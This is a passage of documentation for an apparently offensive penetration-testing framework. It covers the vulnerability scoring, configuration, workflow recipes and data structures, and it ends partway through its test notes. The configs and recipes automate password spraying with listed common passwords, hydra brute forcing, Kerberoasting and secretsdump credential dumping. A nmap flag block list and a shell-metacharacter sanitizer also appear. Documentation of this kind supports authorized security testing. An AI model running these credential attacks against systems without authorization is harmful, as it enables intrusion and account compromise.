### 3.6 VulnScorer (`utils/vuln_scorer.py`)

**Class:** `VulnScorer`

Scores findings using 14 heuristic rules matching patterns in tool output (e.g., `ms17-010|eternalblue` → CRITICAL/9.8, `heartbleed` → HIGH/7.5, `anonymous.*ftp` → MEDIUM/5.3).

#### Key Methods

| Method | Description |
|---|---|
| `score_nmap_scripts(hosts)` | Matches NSE script output against heuristic rules; extracts CVE IDs via regex `CVE-\d{4}-\d{4,}` |
| `score_exploit_match(exploits, severity=HIGH, cvss=7.5)` | Scores searchsploit matches |
| `score_credential(username, host, service, admin=False)` | Admin → CRITICAL/9.0; non-admin → HIGH/7.5 |
| `score_misconfiguration(title, host, severity, cvss, ...)` | Generic misconfiguration scoring |
| `compute_risk_rating() → Dict` | Weighted risk score: CRITICAL×40, HIGH×10, MEDIUM×3, LOW×1. Overall: CRITICAL if any critical or score≥100; HIGH if ≥3 high or score≥50; etc. Includes `attack_narrative` (plain-English worst-case path). |
| `get_findings(min_severity=INFO) → List[Finding]` | Sorted by severity (descending), then CVSS (descending) |

### 3.7 SessionState (`utils/session_state.py`)

**Class:** `SessionState`

Checkpoint/resume system. Saves full results dict to `{session_dir}/session_checkpoint.json` after each phase.

- `save_checkpoint(results, completed_phase)`: Adds `_completed_phases` list, `_checkpoint_time`, `_checkpoint_phase` to results and writes JSON.
- `load_checkpoint() → Dict`: Loads and returns saved state.
- `should_skip_phase(phase_name) → bool`: Checks if phase is in `_completed_phases`.
- `finalize(results)`: Writes `results.json`, marks `_session_complete=True`.

### 3.8 ScreenshotCapture (`utils/screenshot.py`)

**Class:** `ScreenshotCapture`

Backend priority: gowitness → cutycapt → chromium → chrome → curl fallback (HTML-only).

- `capture_all(web_targets, max_workers=5, timeout=30) → Dict[str, str]`: Parallel screenshot capture. Uses gowitness batch mode when available with `gowitness scan file -f {url_file} --screenshot-path {dir} --timeout {t} --threads 5`.
- Saves to `{session_dir}/evidence/screenshots/`.

### 3.9 TUI (`utils/tui.py`)

Built with Textual. `DashboardState` provides thread-safe shared state. `PerfodiaTUI` app displays status bar, stats row (hosts/ports/creds/admin), findings DataTable, live tool output RichLog, and events log.

**Hotkeys:** `q`/`Ctrl+C` → quit, `p` → pause/resume, `r` → refresh, `s` → settings modal, `o` → toggle live output.

### 3.10 ConfigWizard (`utils/config_wizard.py`)

Interactive terminal wizard launched with `--init`. Asks about scan approach (quick/normal/thorough/stealth), lab services (SMB, SNMP, web, AD), exploitation settings, and outputs a YAML config.

Presets:
| Approach | Ports | Timing | Masscan Rate |
|---|---|---|---|
| `quick` | `1-1024` | T4 | 1000 |
| `normal` | `1-65535` | T4 | 1000 |
| `thorough` | `1-65535` | T3 | 1000 |
| `stealth` | `1-1024` | T2 | 500 |

### 3.11 Logger (`utils/logger.py`)

- `setup_logging(level, log_dir, no_color)`: Console handler with ANSI colors.
- `add_session_file_logging(log_dir)`: Adds `all.log` (DEBUG+) and `errors.log` (WARNING+).
- `get_error_summary() → Dict[str, int]`: Returns counts by level from global `_ErrorCounter`.
- `ColorFormatter`: Formats with ANSI: DEBUG=cyan, INFO=green, WARNING=yellow, ERROR=red, CRITICAL=bold red.

### 3.12 Parsers (`utils/parsers.py`)

| Function | Input | Output |
|---|---|---|
| `parse_nmap_xml(xml_path)` | Nmap XML file path | Dict with `hosts[]`, each containing `ip`, `hostname`, `ports[]` (port, protocol, state, service{}, scripts[]), `os_matches[]`, `scripts[]` |
| `parse_nmap_gnmap(gnmap_path)` | Grepable nmap file path | List of host dicts |
| `parse_enum4linux_output(output)` | Raw stdout string | Dict with `users[]`, `shares[]`, `groups[]`, `password_policy{}`, `os_info`, `domain_info` |
| `parse_snmp_output(output)` | Raw snmpwalk stdout | List of `{oid, type, value}` dicts |
| `parse_hydra_output(output)` | Raw hydra stdout | List of `{port, service, host, username, password}` dicts |
| `parse_searchsploit_json(output)` | JSON string | List of `{title, path, type, platform}` dicts |

### 3.13 Validators (`utils/validators.py`)

| Function | Description |
|---|---|
| `validate_target(target) → (bool, Optional[str])` | Accepts IPv4, CIDR (min /16), hostname. Rejects multicast, empty, and CIDR broader than /16. |
| `validate_tool_dependencies(verbose=False) → bool` | Checks all tools in `TOOL_REGISTRY` (32 tools). Returns `True` if all *required* tools (nmap, curl) are present. |
| `is_tool_available(tool_name) → bool` | Quick PATH check via `resolve_tool_binary()`. |
| `resolve_tool_binary(tool_name) → Optional[str]` | Resolves aliases (e.g., crackmapexec → netexec → nxc). |
| `validate_nmap_options(opts_string, allow_all=False) → (bool, list, list)` | Validates user nmap flags. Blocks `-iR` and `--script-updatedb`. Strips shell metacharacters. Skips output flags (`-oX`, etc.). Warns about already-managed flags in extra mode. |
| `validate_config(config) → bool` | Checks timing (0-5), threads (1-100), timeout (≥10s). |
| `check_root_privileges() → bool` | Returns `os.geteuid() == 0`. |

### 3.14 ReportGenerator (`utils/report_generator.py`)

**Class:** `ReportGenerator`

Generates reports in four formats:

- **JSON** (`report.json`): Raw results dump.
- **Markdown** (`report.md`): Executive summary with risk rating, vulnerability findings table (top 50), credential vault table (top 30), per-phase sections (scan, enum, webapp, AD, exploit, crack), screenshot references.
- **HTML** (`report.html`): Dark-themed styled report with color-coded severity badges, stat cards, findings table, credential table, host port tables, and embedded screenshot gallery.
- **PDF** (`report.pdf`): Generated from HTML via WeasyPrint → wkhtmltopdf → Chrome headless (first available).

---

## 4. Configuration Reference

### 4.1 Complete Parameter Table

| Key Path | Type | Default | Valid Values | Description | Module(s) |
|---|---|---|---|---|---|
| `general.threads` | int | `10` | `1-100` | Parallel thread count | All (via ParallelRunner) |
| `general.timeout` | int | `300` | `≥10` | Default tool timeout (seconds) | All (via ToolRunner) |
| `general.max_retries` | int | `2` | `0-10` | Max retry attempts per tool | All (via ToolRunner) |
| `general.retry_delay` | int | `5` | `≥0` | Seconds between retries | All (via ToolRunner) |
| `nmap.default_ports` | str | `"1-65535"` | Nmap port spec | Port range for detailed scan | Scanning |
| `nmap.timing_template` | int | `4` | `0-5` | Nmap `-T` value | Scanning |
| `nmap.max_retries` | int | `2` | `0-10` | Nmap `--max-retries` | Scanning |
| `nmap.host_timeout` | str | `"5m"` | Nmap time | Per-host timeout | Scanning |
| `nmap.scripts` | list | `["default","vuln","safe"]` | Script names | NSE scripts for vuln scan | Scanning |
| `nmap.extra_args` | list | `[]` | Nmap flags | Additional flags from config | Scanning |
| `masscan.rate` | int | `1000` | `1-100000` | Packets/second | Scanning |
| `masscan.ports` | str | `"1-65535"` | Port range | Masscan port range | Scanning |
| `enumeration.smb.enabled` | bool | `true` | — | Enable SMB enum | Enumeration |
| `enumeration.smb.depth` | str | `"full"` | `basic`, `full` | SMB enumeration depth | Enumeration |
| `enumeration.snmp.enabled` | bool | `true` | — | Enable SNMP enum | Enumeration |
| `enumeration.snmp.community_strings` | list | `["public","private","community"]` | Strings | SNMP community strings | Enumeration |
| `enumeration.http.wordlist` | str | `/usr/share/wordlists/dirb/common.txt` | File path | Directory brute-force wordlist | Enumeration, WebApp |
| `enumeration.http.extensions` | str | `"php,html,txt,asp,aspx,jsp"` | Comma-separated | File extensions for gobuster | Enumeration |
| `exploitation.safe_mode` | bool | `true` | — | Skip credential attacks | Exploitation, AD |
| `exploitation.auto_exploit` | bool | `false` | — | Auto-exploit (reserved) | Exploitation |
| `credentials.usernames` | list | `["admin","root","administrator","user","test"]` | Strings | Default usernames for hydra | Exploitation |
| `credentials.passwords_file` | str | `/usr/share/wordlists/quick_passwords.txt` | File path | Password wordlist | Exploitation |
| `credentials.spray_lockout_threshold` | int | `3` | `1-10` | Max spray attempts per account | Exploitation, AD |
| `credentials.spray_delay` | int | `30` | `≥0` | Seconds between spray rounds | Exploitation, AD |
| `webapp.enabled` | bool | `true` | — | Enable web app testing | WebApp |
| `webapp.wordlist` | str | `/usr/share/wordlists/dirb/common.txt` | File path | ffuf/wfuzz wordlist | WebApp |
| `webapp.extensions` | str | `"php,html,txt,bak,old,conf,asp,aspx,jsp,json,xml"` | Comma-separated | ffuf file extensions | WebApp |
| `webapp.sqlmap_enabled` | bool | `true` | — | Enable sqlmap | WebApp |
| `webapp.sqlmap_level` | int | `1` | `1-5` | Sqlmap aggressiveness | WebApp |
| `webapp.sqlmap_risk` | int | `1` | `1-3` | Sqlmap risk level | WebApp |
| `ad.enabled` | bool | `true` | — | Enable AD assessment | AD |
| `ad.bloodhound_collect` | bool | `true` | — | BloodHound collection | AD |
| `ad.spray_passwords` | list | `["Password1","Welcome1","Company123","Spring2025","Summer2025","Changeme1"]` | Strings | AD spray passwords | AD |
| `ad.max_spray_users` | int | `200` | `1-10000` | Max users per spray round | AD |
| `ad.check_smb_signing` | bool | `true` | — | Check SMB signing | AD |
| `cracking.enabled` | bool | `true` | — | Enable cracking | Cracking |
| `cracking.wordlist` | str | `/usr/share/wordlists/rockyou.txt` | File path | Cracking wordlist | Cracking |
| `cracking.max_runtime` | int | `600` | `≥60` | Max seconds per hash type | Cracking |
| `cracking.use_rules` | bool | `true` | — | Use hashcat rules | Cracking |
| `screenshots.enabled` | bool | `true` | — | Enable screenshots | Screenshot |
| `screenshots.max_workers` | int | `5` | `1-20` | Parallel screenshot threads | Screenshot |
| `screenshots.timeout` | int | `30` | `≥5` | Per-screenshot timeout | Screenshot |
| `reporting.include_raw_output` | bool | `true` | — | Include raw tool output | Report |
| `reporting.severity_threshold` | str | `"low"` | `low`, `medium`, `high`, `critical` | Minimum severity to report | Report |
| `reporting.include_remediation` | bool | `true` | — | Include remediation advice | Report |
| `reporting.include_risk_rating` | bool | `true` | — | Executive risk rating | Report |
| `reporting.include_screenshots` | bool | `true` | — | Embed screenshot links | Report |

### 4.2 Configuration Precedence

1. **CLI flags** (e.g., `--nmap-extra`, `--nmap-raw`, `--nmap-scan-type`) → stored in `nmap_user_opts`
2. **YAML config file** (specified with `-c`)
3. **Built-in defaults** (from `FrameworkConfig._apply_defaults()`)

Defaults fill in missing keys at up to 3 levels of nesting.

### 4.3 Example Configurations

#### Internal Network Pentest

```yaml
general:
  threads: 15
  timeout: 600
nmap:
  default_ports: "1-65535"
  timing_template: 4
exploitation:
  safe_mode: false
  auto_exploit: false
credentials:
  spray_lockout_threshold: 2
  spray_delay: 60
ad:
  enabled: true
  bloodhound_collect: true
```

#### Web-Only Assessment

```yaml
general:
  threads: 10
nmap:
  default_ports: "80,443,8080,8443,8000,8888"
  timing_template: 4
enumeration:
  smb:
    enabled: false
  snmp:
    enabled: false
webapp:
  enabled: true
  sqlmap_enabled: true
  sqlmap_level: 2
  sqlmap_risk: 2
ad:
  enabled: false
exploitation:
  safe_mode: true
cracking:
  enabled: false
```

#### Stealth / Slow Scan

```yaml
general:
  threads: 3
  timeout: 900
nmap:
  default_ports: "1-1024"
  timing_template: 2
  host_timeout: "15m"
masscan:
  rate: 100
exploitation:
  safe_mode: true
```

#### AD-Focused Engagement

```yaml
general:
  threads: 10
nmap:
  default_ports: "53,88,135,139,389,445,464,636,3268,3269,5985,5986"
enumeration:
  smb:
    enabled: true
    depth: full
ad:
  enabled: true
  bloodhound_collect: true
  spray_passwords:
    - "Summer2025"
    - "Welcome1"
    - "Password1"
  max_spray_users: 500
exploitation:
  safe_mode: false
credentials:
  spray_lockout_threshold: 2
  spray_delay: 120
```

---

## 5. Workflow Recipes

### 5.1 Full Internal Pentest

```bash
sudo python3 perfodia.py -t 192.168.1.0/24 -m full -c configs/internal.yaml -v
```

All 8 phases execute sequentially. Credentials flow from exploitation to AD to cracking to post-exploitation. Results in `sessions/{timestamp}/`.

### 5.2 Web-Only Assessment

```bash
sudo python3 perfodia.py -t 10.0.0.50 -m full -c configs/web_only.yaml
```

With `ad.enabled=false`, `enumeration.smb.enabled=false`, only scanning → HTTP enumeration → web app testing → exploitation (searchsploit only in safe mode) phases produce meaningful output.

### 5.3 AD-Focused Engagement

```bash
sudo python3 perfodia.py -t 192.168.1.10 -m full -c configs/ad_focused.yaml
```

Narrow port scan focused on AD ports. Enumeration feeds LDAP data to AD module. AS-REP roasting runs without creds. Kerberoasting and BloodHound run if hydra finds creds. Hashes fed to cracking module.

### 5.4 Stealth / Slow Scan

```bash
sudo python3 perfodia.py -t 10.0.0.0/24 -m full -c configs/stealth.yaml
```

Low timing (T2), 3 threads, rate-limited masscan (100 pps), long timeouts. Safe mode prevents credential attacks.

### 5.5 Resume from Failure

```bash
# Session interrupted (Ctrl+C, crash, etc.)
# Checkpoint saved automatically to session_checkpoint.json

# Resume: (future implementation — currently requires manual orchestration)
# The SessionState class provides the infrastructure:
#   state = SessionState(session_dir)
#   results = state.load_checkpoint()
#   completed = state.get_completed_phases()
#   # Skip completed phases, continue from next
```

### 5.6 Hash Cracking Standalone

You can run the cracking module independently by placing hash files in the `loot/` directory following the naming conventions: `asrep_hashes_*.txt`, `kerberoast_*.txt`, `secretsdump_*.ntds`. The module also reads from the credential vault JSON.

### 5.7 Interactive TUI Mode

```bash
python3 perfodia.py --interactive
```

Launches the Textual TUI with live tool output, findings table, event log, and stats. Currently runs a demo workflow. Use `o` to toggle live output, `p` to pause, `s` for settings modal.

### 5.8 Docker Deployment

```bash
docker-compose up -d
docker exec -it perfodia bash
python3 perfodia.py -t 192.168.1.0/24 -m full --interactive
```

The Dockerfile installs all dependencies. The `docker-entrypoint.sh` handles tool verification on startup.

---

## 6. Troubleshooting & Diagnostics

### 6.1 Error Message → Cause → Fix

| Error Pattern | Category | Cause | Fix |
|---|---|---|---|
| `Tool '{name}' not found in PATH` | `not_found` | Tool not installed | Install via package manager or update `tool_paths` in config |
| `SCOPE VIOLATION: {tool} targets an out-of-scope IP` | `scope_violation` | Target IP not in allowed ranges | Add target to scope or check exclusion list |
| `{tool} timed out after {n}s` | `timeout` | Tool exceeded timeout | Increase `general.timeout`, reduce scan scope, or increase per-tool timeout |
| `{tool} needs higher privileges` | `permission` | Missing root/sudo | Run with `sudo` or use `--nmap-scan-type sT` for non-root scans |
| `{tool} rejected the arguments (exit code {n})` | `usage` | Invalid flags for tool version | Check tool version compatibility; update flags |
| `Permission denied writing output file` | `os_error` | Session dir not writable | Check directory permissions |
| `Binary vanished between pre-flight check and execution` | `not_found` | Broken symlink or uninstall mid-run | Reinstall tool |
| `OS error executing {tool}: {e}` | `os_error` | Disk full, missing library | Check disk space, install dependencies |
| `Failed to parse nmap XML` | Parse error | Corrupt or incomplete XML | Check nmap completed successfully; re-run scan |
| `YAML parse error in {path}` | Config error | Malformed YAML | Validate YAML syntax; use config wizard |
| `Config file not found: {path}` | Config warning | Wrong path | Check `-c` argument; falls back to defaults |
| `nmap.timing_template must be 0-5` | Validation | Invalid timing value | Use integer 0-5 |
| `general.threads must be 1-100` | Validation | Invalid thread count | Use integer 1-100 |
| `CIDR range /{n} is too broad` | Validation | CIDR prefix < /16 | Use /16 or narrower range |

### 6.2 Tool Dependency Check

```bash
python3 -c "from utils.validators import validate_tool_dependencies; validate_tool_dependencies(verbose=True)"
```

Lists all 32 registered tools with status: `[✓]` found, `[✗]` missing required, `[—]` missing optional with install hints.

**Required tools** (framework won't function without): `nmap`, `curl`.

### 6.3 Log Files

| File | Content | Level |
|---|---|---|
| `{session}/logs/all.log` | Complete trace of every operation | DEBUG+ |
| `{session}/logs/errors.log` | Quick-scan summary of problems | WARNING+ |
| `{session}/logs/stderr/{tool}_{time}.stderr.log` | Full stderr from failed tools | Per-tool |
| `{session}/logs/scope_violations.json` | All scope violation records | — |

### 6.4 Session Recovery

1. Navigate to the session directory
2. Check `session_checkpoint.json` for `_completed_phases`
3. The credential vault persists in `loot/credential_vault.json`
4. All tool output files are preserved in their respective directories
5. Re-run with the same config; the framework can skip completed phases via `SessionState.should_skip_phase()`

---

## 7. Extending the Framework

### 7.1 Adding a New Module

1. **Create the module file** in `modules/`:

```python
from modules.base import BaseModule

class MyModule(BaseModule):
    MODULE_NAME = "mymod"

    def run(self, previous_results=None):
        self.log_phase_start("My Phase")
        results = {"status": "running"}
        # Use self.runner.run(tool_name=..., args=[...]) for tool execution
        # Use self._store_credential(...) for vault integration
        # Use self._score_finding(...) for vulnerability scoring
        results["status"] = "completed"
        self.log_phase_end("My Phase")
        return results
```

2. **The base class contract requires:**
   - `MODULE_NAME` class attribute (string)
   - `run(self, previous_results=None) → Dict[str, Any]` method
   - Access shared infrastructure via `self.runner`, `self.parallel`, `self.credential_vault`, `self.vuln_scorer`, `self.scope_guard`, `self.config`, `self.session_dir`

3. **Register** by importing in `perfodia.py` and adding to the phase orchestration sequence.

### 7.2 Adding a New Tool Integration

Within an existing module, add a private method:

```python
def _my_tool_scan(self, ip, port):
    result = self.runner.run(
        tool_name="mytool",            # Must be in PATH or tool_paths config
        args=["-t", ip, "-p", str(port)],
        timeout=120,
        output_file=f"enum/mytool_{ip}_{port}.txt",
        retries=1,
    )
    if result.success:
        return {"data": result.stdout}
    return {"error": result.error_message}
```

Add the tool to `TOOL_REGISTRY` in `utils/validators.py`:

```python
"mytool": ("mytool", "apt: mytool-package", False),  # (binary, install hint, required)
```

### 7.3 Adding a New Parser

Add a function to `utils/parsers.py`:

```python
def parse_mytool_output(output: str) -> Dict[str, Any]:
    """Parse mytool output into structured data."""
    results = {}
    for line in output.strip().split("\n"):
        # Your parsing logic
        pass
    return results
```

Use it via `ToolRunner.run(parse_func=parse_mytool_output)` or call it directly on `result.stdout`.

### 7.4 Adding Custom Report Sections

In `utils/report_generator.py`, add methods to both the markdown and HTML generators:

```python
# In _generate_markdown:
def _md_section_mymod(self, data: Dict) -> list:
    lines = ["## My Module Results", ""]
    # Build markdown from data
    return lines

# In _generate_html:
# Add HTML block in the _generate_html method after existing sections
```

Then call them from the main generation methods when the relevant phase data exists:

```python
if "mymod" in phases:
    lines.extend(self._md_section_mymod(phases["mymod"]))
```

---

## Appendix A: CLI Quick Reference

```
perfodia.py [-t TARGET] [-m MODE] [--interactive]
```

| Flag | Default | Description |
|---|---|---|
| `-t`, `--target` | `127.0.0.1` | Target IP, CIDR, or hostname |
| `-m`, `--mode` | `full` | Execution mode |
| `--interactive` | `false` | Launch Textual TUI |

**Note:** The current CLI in v1.1.0 implements TUI mode (`--interactive`) with a demo workflow. Non-interactive mode logs a placeholder message. Full phase orchestration requires programmatic use of the module classes.

## Appendix B: External Tool Reference

| Tool | Required | Package | Used By |
|---|---|---|---|
| nmap | **Yes** | `nmap` | Scanning, Enumeration, AD |
| curl | **Yes** | `curl` | Enumeration, WebApp |
| masscan | No | `masscan` | Scanning |
| dig | No | `dnsutils` | Recon, Enumeration |
| whois | No | `whois` | Recon |
| whatweb | No | `whatweb` | Recon |
| dnsrecon | No | `dnsrecon` | Recon |
| enum4linux-ng | No | `pip: enum4linux-ng` | Enumeration |
| smbclient | No | `smbclient` | Enumeration |
| rpcclient | No | `smbclient` | Enumeration |
| nbtscan | No | `nbtscan` | Enumeration |
| nikto | No | `nikto` | Enumeration |
| gobuster | No | `gobuster` | Enumeration |
| onesixtyone | No | `onesixtyone` | Enumeration |
| snmpwalk | No | `snmp` | Enumeration |
| ffuf | No | `github: ffuf/ffuf` | WebApp |
| wfuzz | No | `pip: wfuzz` | WebApp |
| sqlmap | No | `sqlmap` | WebApp |
| searchsploit | No | `exploitdb` | Exploitation |
| hydra | No | `hydra` | Exploitation |
| crackmapexec/netexec/nxc | No | `pip: netexec` | Exploitation, AD |
| impacket-GetNPUsers | No | `pip: impacket` | AD, Post-Exploitation |
| impacket-GetUserSPNs | No | `pip: impacket` | AD, Post-Exploitation |
| impacket-secretsdump | No | `pip: impacket` | Post-Exploitation |
| impacket-psexec | No | `pip: impacket` | Post-Exploitation |
| bloodhound-python | No | `pip: bloodhound` | AD |
| ldapsearch | No | `ldap-utils` | AD |
| hashcat | No | `hashcat` | Cracking |
| john | No | `john` | Cracking |
| gowitness | No | `github: sensepost/gowitness` | Screenshots |
| cutycapt | No | `cutycapt` | Screenshots |

---

---

## Appendix C: Detailed Data Structures

### C.1 Scan Host Dictionary (Produced by ScanningModule, consumed everywhere)

The central data structure flowing through the framework is the host dictionary produced by `parse_nmap_xml()`:

```python
{
    "ip": "192.168.1.10",
    "hostname": "dc01.lab.local",
    "state": "up",
    "mac": "00:0C:29:XX:XX:XX",           # Optional, from ARP
    "mac_vendor": "VMware, Inc.",           # Optional
    "ports": [
        {
            "port": 445,
            "protocol": "tcp",
            "state": "open",
            "reason": "syn-ack",
            "service": {
                "name": "microsoft-ds",
                "product": "Windows Server 2019",
                "version": "10.0",
                "extrainfo": "name:LAB; domain:lab.local",
                "tunnel": "",               # "ssl" for HTTPS
                "method": "probed",
                "conf": "10"
            },
            "scripts": [
                {
                    "id": "smb-vuln-ms17-010",
                    "output": "VULNERABLE: Remote Code Execution..."
                }
            ]
        }
    ],
    "os_matches": [
        {
            "name": "Windows Server 2019",
            "accuracy": "95"
        }
    ],
    "scripts": []  # Host-level NSE scripts
}
```

### C.2 Credential Vault Entry (Credential Dataclass)

```python
{
    "username": "admin",
    "secret": "Password123",               # Or hash value
    "cred_type": "password",               # CredType enum value
    "domain": "LAB",                       # AD domain, empty for local
    "host": "192.168.1.10",
    "port": 445,
    "service": "smb",
    "source_phase": "exploit",             # Module that discovered it
    "source_tool": "hydra",
    "timestamp": "2025-01-15T10:30:00",
    "verified": true,
    "verified_on": ["192.168.1.10", "192.168.1.20"],
    "admin_access": false,
    "notes": ""
}
```

The `identity` property used for deduplication is computed as:
```
{domain}\{username}:{cred_type}:{sha256(secret)[:16]}
```

### C.3 Vulnerability Finding (Finding Dataclass)

```python
{
    "title": "MS17-010 (EternalBlue) SMB Remote Code Execution",
    "severity": "critical",                # Severity enum value
    "cvss_score": 9.8,
    "cve_ids": ["CVE-2017-0144"],
    "host": "192.168.1.10",
    "port": 445,
    "service": "microsoft-ds",
    "description": "",
    "evidence": "VULNERABLE: CVE-2017-0144...",  # Truncated to 500 chars
    "remediation": "Patch with MS17-010. Disable SMBv1.",
    "source_phase": "scan",
    "source_tool": "nmap",
    "mitre_attack": []                     # e.g. ["T1110 — Brute Force"]
}
```

### C.4 ToolResult Dictionary (from `to_dict()`)

```python
{
    "tool": "nmap",
    "command": "nmap -sS -sV -sC -O -T4 ...",
    "return_code": 0,
    "stdout_lines": 142,
    "stderr_lines": 0,
    "stderr_preview": "",
    "duration_seconds": 45.23,
    "success": true,
    "output_files": ["/session/nmap/scan_192.168.1.10_stdout.txt"],
    "error_message": null,
    "error_category": null
}
```

### C.5 ParallelResult

```python
{
    "total": 10,
    "succeeded": 8,
    "failed": 2,
    "results": {"192.168.1.1": {...}, "192.168.1.2": {...}, ...},
    "errors": {"192.168.1.5": "TimeoutError: ...", ...},
    "duration": 123.45
}
```

---

## Appendix D: Heuristic Vulnerability Rules

The `VulnScorer` contains 14 built-in heuristic rules that match patterns in NSE script output. Each rule is a tuple of `(regex_pattern, severity, cvss_score, title, remediation)`:

| # | Pattern | Severity | CVSS | Title |
|---|---|---|---|---|
| 1 | `ms17-010\|eternalblue` | CRITICAL | 9.8 | MS17-010 (EternalBlue) SMB RCE |
| 2 | `ms08-067` | CRITICAL | 10.0 | MS08-067 Windows Server Service RCE |
| 3 | `heartbleed\|ssl-heartbleed` | HIGH | 7.5 | OpenSSL Heartbleed Information Disclosure |
| 4 | `shellshock\|CVE-2014-6271` | CRITICAL | 9.8 | Bash Shellshock RCE |
| 5 | `anonymous.*ftp\|ftp.*anonymous` | MEDIUM | 5.3 | Anonymous FTP Access Enabled |
| 6 | `null.*session\|anonymous.*smb` | MEDIUM | 5.3 | SMB Null Session / Anonymous Access |
| 7 | `default.*credentials\|default.*password` | HIGH | 8.1 | Default Credentials In Use |
| 8 | `ssl-cert.*expired` | LOW | 3.1 | Expired SSL/TLS Certificate |
| 9 | `ssl.*weak\|sslv[23]\|tlsv1\.0` | MEDIUM | 5.9 | Weak SSL/TLS Protocol Version |
| 10 | `dns.*recursion\|recursion.*enabled` | MEDIUM | 5.0 | DNS Recursion Enabled |
| 11 | `snmp.*public\|community.*public` | MEDIUM | 5.3 | SNMP Default Community String |
| 12 | `smb-vuln-cve-2020-0796\|smbghost` | CRITICAL | 10.0 | SMBGhost (CVE-2020-0796) RCE |
| 13 | `log4j\|log4shell\|CVE-2021-44228` | CRITICAL | 10.0 | Log4Shell RCE |
| 14 | `bluekeep\|CVE-2019-0708` | CRITICAL | 9.8 | BlueKeep RDP RCE |

#### Risk Score Computation

The overall risk rating uses a weighted formula:

```
score = (critical_count × 40) + (high_count × 10) + (medium_count × 3) + (low_count × 1)
```

Rating thresholds:
- **CRITICAL**: Any critical finding OR score ≥ 100
- **HIGH**: ≥3 high findings OR score ≥ 50
- **MEDIUM**: Any high finding OR score ≥ 20
- **LOW**: Any medium finding OR score ≥ 5
- **INFORMATIONAL**: All else

---

## Appendix E: Session Directory Layout

After a complete run, the session directory has this structure:

```
sessions/{timestamp}/
├── nmap/
│   ├── discovery_{target}.gnmap
│   ├── discovery_{target}.txt
│   ├── scan_{ip}.xml
│   ├── scan_{ip}.nmap
│   ├── scan_{ip}_stdout.txt
│   ├── vuln_{ip}.xml
│   └── masscan_{target}.gnmap
├── recon/
│   ├── dns_{target}_{rtype}.txt
│   ├── dns_{target}_full.txt
│   ├── dnsrecon_{target}.txt
│   ├── whois_{target}.txt
│   ├── whatweb_{target}_{scheme}.json
│   └── zone_transfer_{target}_{ns}.txt
├── enum/
│   ├── enum4linux_{ip}.txt
│   ├── smbclient_{ip}.txt
│   ├── nbtscan_{ip}.txt
│   ├── snmpwalk_{ip}_{oid_name}.txt
│   ├── onesixtyone_{ip}.txt
│   ├── http_headers_{ip}_{port}.txt
│   ├── nikto_{ip}_{port}.txt
│   ├── gobuster_{ip}_{port}.txt
│   ├── ffuf_{ip}_{port}.json
│   ├── smtp_{ip}_{port}.txt
│   ├── ldap_{ip}_{port}.txt
│   ├── ldap_anon_{dc_ip}.txt
│   ├── ldap_auth_{dc_ip}.txt
│   ├── ldap_groups_{dc_ip}.txt
│   ├── ad_trusts_{dc_ip}.txt
│   ├── ad_gpo_{dc_ip}.txt
│   ├── mysql_{ip}_{port}.txt
│   ├── mssql_{ip}_{port}.txt
│   ├── postgres_{ip}_{port}.txt
│   ├── rdp_{ip}_{port}.txt
│   └── sqlmap_{ip}_{port}/
├── exploits/
│   ├── users_{ip}_{port}.txt
│   ├── hydra_{ip}_{port}.txt
│   ├── hydra_{ip}_{port}_stdout.txt
│   ├── cme_{ip}.txt
│   └── autopwn.rc
├── loot/
│   ├── credential_vault.json
│   ├── asrep_users_{dc_ip}.txt
│   ├── asrep_hashes_{dc_ip}.txt
│   ├── asrep_{dc_ip}_stdout.txt
│   ├── kerberoast_{dc_ip}.txt
│   ├── kerberoast_{dc_ip}_stdout.txt
│   ├── spray_users_{dc_ip}.txt
│   ├── spray_{dc_ip}_{pwd}.txt
│   ├── secretsdump_{host}.ntds
│   ├── secretsdump_{host}_stdout.txt
│   ├── psexec_{host}_stdout.txt
│   ├── crack_{hash_type}_{source}.txt
│   ├── crack_{hash_type}_{source}.pot
│   ├── crack_{hash_type}_{source}.cracked
│   ├── hashcat_{hash_type}_stdout.txt
│   ├── john_{hash_type}_stdout.txt
│   ├── linux_privesc_enum.sh
│   ├── windows_privesc_enum.bat
│   ├── lateral_movement_guide.txt
│   └── bloodhound/
│       └── bh_*.zip
├── evidence/
│   └── screenshots/
│       ├── urls.txt
│       ├── {safe_filename}.png
│       └── gowitness.sqlite3
├── logs/
│   ├── all.log
│   ├── errors.log
│   ├── scope_violations.json
│   └── stderr/
│       └── {tool}_{time}.stderr.log
├── session_checkpoint.json
├── results.json
├── report.json
├── report.md
├── report.html
└── report.pdf
```

---

## Appendix F: Edge Cases & Behavioral Notes from Tests

The test suite reveals several important behavioral details:

### F.1 Credential Vault Deduplication

From `test_credential_vault.py`: Adding the same `username:password` combination twice results in only one entry. The identity hash uses SHA-256 of the secret, so even if `host` differs, the same `username + cred_type + secret` deduplicates. However, different cred types (password vs. NTLM hash) for the same username are stored separately (`test_different_types_not_deduped`).

### F.2 Domain Credentials Apply Everywhere

From `test_domain_creds_apply_everywhere`: A credential with a `domain` field set can be retrieved via `get_for_host()` for ANY host, not just the host it was discovered on. This enables cross-host reuse of AD credentials.

### F.3 ParallelRunner Error Isolation

From `test_error_isolation`: If a function raises an exception for one host (e.g., `ValueError`), other hosts continue processing successfully. The failed host's error is captured in `result.errors` while successful hosts' data is in `result.results`.

### F.4 ParallelRunner Worker Limits

From `test_max_workers_capped` and `test_min_workers`: The worker count is clamped to `[1, 50]`. Values of 0 become 1; values above 50 become 50.

### F.5 Sanitizer Preserves Tool-Required Characters

From `test_normal_tool_args_preserved`: The sanitizer deliberately preserves colons (`:`), at-signs (`@`), forward slashes (`/`), and dashes (`-`) since these are needed for tool arguments like `user:password@192.168.1.1`, file paths, and flags. Only shell metacharacters (`;`, `|`, `&`, backticks, `$()`, `{}`, `!`, `\`, `<>`, newlines, null bytes) are stripped.

### F.6 Scope Guard: Deny List Priority

From `test_exclusion_takes_priority`: If an IP is in both the allowed networks AND the exclusion list, the exclusion wins. This is implemented in `_check_ip()` where denied networks are checked before allowed networks.

### F.7 Nmap Validation: Dangerous Flags

From `test_dangerous_flag_blocked`: The flag `-iR` (random targets) is hard-blocked and causes `validate_nmap_options()` to return `is_valid=False`. Similarly, `--script-updatedb` is blocked. These are in `_NMAP_DANGEROUS_FLAGS`.

### F.8 Nmap Validation: Output Flag Stripping

From `test_output_flag_skipped`: User-supplied output flags (`-oX`, `-oN`, `-oG`, `-oA`, `-oS`) are silently removed from the argument list since the framework manages its own output files. A warning is returned explaining this behavior. The flag AND its next argument (the file path) are both removed.

### F.9 VulnScorer: CVE Extraction

